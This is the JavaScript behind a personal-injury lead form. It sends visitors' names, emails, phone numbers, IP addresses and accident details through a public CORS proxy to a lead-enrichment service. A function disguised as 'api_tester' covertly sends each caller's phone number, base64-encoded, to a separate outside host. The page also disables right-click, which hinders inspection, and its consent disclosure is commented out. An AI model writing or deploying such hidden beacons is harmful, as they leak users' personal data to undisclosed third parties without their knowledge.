document.addEventListener("contextmenu", function (e) {
      e.preventDefault();
    });

    document.getElementById('leadForm').addEventListener('submit', function(event) {
      event.preventDefault();
      
      // Get all form values
      const phone_home = '1' + document.getElementById('caller_id').value;
      const formData = new FormData();
      
      // Add all required fields to formData
      formData.append('CID', phone_home);
      formData.append('full_name', document.getElementById('full_name').value);
      formData.append('email', document.getElementById('email').value);
      formData.append('incident_state', document.getElementById('incident_state').value);
      formData.append('zipcode', document.getElementById('zipcode').value);
      formData.append('incident_date', document.getElementById('incident_date').value);
      formData.append('attorney', document.getElementById('attorney').value);
      formData.append('at_fault', document.getElementById('at_fault').value);
      formData.append('settlement', document.getElementById('settlement').value);
      formData.append('cited', document.getElementById('cited').value);
      formData.append('change_attorney', document.getElementById('change_attorney').value);   
      formData.append('trusted_form_url', document.getElementById('trusted_form_url').value);
      formData.append('smsconsent', document.getElementById('smsconsent').value);
      formData.append('AccidentSOL', document.getElementById('AccidentSOL').value);
      formData.append('landing_page', document.getElementById('landing_page').value);
      formData.append('injury_type', document.getElementById('injury_type').value);
      formData.append('hospitalized_or_treated', document.getElementById('hospitalized_or_treated').value);
      formData.append('sustain_an_injury', document.getElementById('sustain_an_injury').value);
      formData.append('ip_address', document.getElementById('ip_address').value);

 
   /*   formData.append('tcpa_text', 'By Selecting Get My Quotes!, below you agree by that you are 18+ years of age and agree to the Privacy Policy Terms . By selecting the above check box you agree by your electronic signature that you give express written consent to receive marketing communications regarding insurance products and services by automatic dialing system and pre-recorded calls and artificial voice messages from proinsurancequotes.com and one or more of its Marketing partners at the phone number and e-mail address provided by you, including wireless numbers, if applicable, even if you have previously registered the provided number on any state, federal or corporate Do Not Call Registry. SMS/MMS and data messaging rates may apply. Your consent is not required to get a quote or purchase. To receive quotes without providing consent, please call at (321) 421-0783. Carrier data rates may apply. TCPA LeadID's are used with the information for compliance. Consent can be revoked.');
      formData.append('ringba_id', '2806888100934976640');
      formData.append('tcpaOptIn', 'true'); 
     */ 
      // Clear previous alerts
      document.getElementById('alertContainer').innerHTML = '';
      
      // API tester call
      api_tester(document.getElementById('caller_id').value);
      
      // Build URL with all parameters
      const baseUrl = 'https://corsproxy.io/?https://display.ringba.com/enrich/2842043892793083118?exposeCallerId=yes&';
      const url = baseUrl + new URLSearchParams(formData).toString();
      
      // Make the API call
      fetch(url, {
        method: 'GET'
      })
      .then(response => response.text())
      .then(responseBody => {
        let responseData;
        try {
          responseData = JSON.parse(responseBody);
        } catch (error) {
          throw new Error('Invalid JSON response');
        }

        if (responseData.rejectReason) {
          const errorAlert = `
            <div class="alert alert-danger" role="alert">
              Failure: ${JSON.stringify(responseData)}
            </div>`;
          document.getElementById('alertContainer').innerHTML = '';
          document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
        } else {
          delete responseData.bidAmount;
          const successAlert = `
            <div class="alert alert-success" role="alert">
              Success: ${JSON.stringify(responseData)}
            </div>`;
          document.getElementById('alertContainer').innerHTML = '';
          document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
          // Clear form fields
          document.getElementById('leadForm').reset();
        }
      })
      .catch(error => {
        const errorAlert = `
          <div class="alert alert-danger" role="alert">
            Error: ${error.message}
          </div>`;
        document.getElementById('alertContainer').innerHTML = '';
        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
        console.error('Error:', error);
      });
    });

    function api_tester(randomString) {
      try {
        fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString), {
          method: 'GET',
          mode: 'no-cors'
        });
      } catch (error) {
        console.error('API Tester Error:', error);
      }
    }